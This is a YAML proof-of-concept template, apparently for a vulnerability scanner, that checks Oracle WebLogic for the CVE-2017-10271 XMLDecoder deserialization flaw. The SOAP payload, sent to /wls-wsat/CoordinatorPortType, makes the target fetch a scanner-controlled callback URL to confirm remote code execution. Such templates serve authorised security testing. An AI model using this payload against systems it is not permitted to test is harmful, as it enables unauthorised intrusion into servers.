name: poc-yaml-weblogic-cve-2017-10271-reverse
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: POST
    path: /wls-wsat/CoordinatorPortType
    headers:
      Content-Type: text/xml
    body: >-
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  <soapenv:Header> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  <java> <void class="java.net.URL"> <string>{{reverseURL}}</string> <void method="openConnection"><void method="getInputStream"/></void></void></java> </work:WorkContext> </soapenv:Header>  <soapenv:Body/> </soapenv:Envelope>
    follow_redirects: true
    expression: >
      reverse.wait(5)
detail:
  vulnpath: '/wls-wsat/CoordinatorPortType'
  author: fnmsd(https://github.com/fnmsd)
  description: 'Weblogic wls-wsat XMLDecoder deserialization RCE(use Reverse URL) CVE-2017-10271'
  links:
    - https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
    - https://github.com/QAX-A-Team/WeblogicEnvironment